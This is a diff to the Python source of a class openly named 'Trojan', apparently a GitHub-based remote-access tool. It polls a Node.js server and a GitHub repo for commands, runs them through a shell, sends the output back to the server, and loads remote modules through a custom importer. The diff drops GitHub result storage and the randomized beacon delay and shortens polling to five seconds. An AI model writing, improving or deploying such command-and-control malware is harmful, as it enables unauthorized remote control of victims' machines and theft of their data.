@@ -2,7 +2,6 @@ import base64
 import github3
 import importlib
 import json
-import random
 import sys
 import threading
 import time
@@ -33,6 +32,7 @@ class Trojan:
         try:
             config_json = get_file_contents('config', self.config_file, self.repo)
             decoded_config = base64.b64decode(config_json).decode('utf-8')
+            # print(f"Decoded config JSON: {decoded_config}")  # Debug output
             return json.loads(decoded_config)
         except Exception as e:
             print(f"Error fetching GitHub config: {e}")
@@ -73,16 +73,11 @@ class Trojan:
                 shell_command = command.get('command')
                 if shell_command:
                     try:
-                        print(f"[*] Executing command: {shell_command}")
+                        print(f"[*] Executing command: {shell_command}")  # Debug output
                         result = subprocess.check_output(shell_command, shell=True, stderr=subprocess.STDOUT)
                         result = result.decode('utf-8')
                     except subprocess.CalledProcessError as e:
                         result = e.output.decode('utf-8')
-                    
-                    # Save the result to GitHub
-                    self.store_command_result(shell_command, result)
-
-                    # Send the result to the Node.js server
                     self.send_command_result(shell_command, result)
             elif command_type == 'module':
                 module_name = command.get('module')
@@ -93,19 +88,6 @@ class Trojan:
                     thread.start()
         else:
             print(f"Invalid command format: {command}")
-
-    def store_command_result(self, command, result):
-        timestamp = datetime.now().isoformat()
-        file_name = f"{timestamp}_shell_command.txt"
-        file_content = f"Command: {command}\n\nResult:\n{result}"
-        
-        # Encode the content to base64
-        bindata = base64.b64encode(file_content.encode('utf-8'))
-
-        # Save the file to the data folder in GitHub
-        remote_path = f'data/{self.id}/{file_name}'
-        commit_message = f"Saving output of shell command: {command}"
-        self.repo.create_file(remote_path, commit_message, bindata)
 
     def module_runner(self, module):
         result = sys.modules[module].run()
@@ -119,7 +101,6 @@ class Trojan:
 
     def run(self):
         while self.running:
-            github_config = self.get_github_config()
             nodejs_config = self.get_nodejs_config()
 
             if nodejs_config:
@@ -131,7 +112,7 @@ class Trojan:
                 for command in nodejs_config.get('commands', []):
                     self.execute_command(command)
 
-            time.sleep(random.randint(30*60, 3*60*60))
+            time.sleep(5)  # Reduced sleep time for faster polling
 
 class GitImporter:
     def __init__(self):
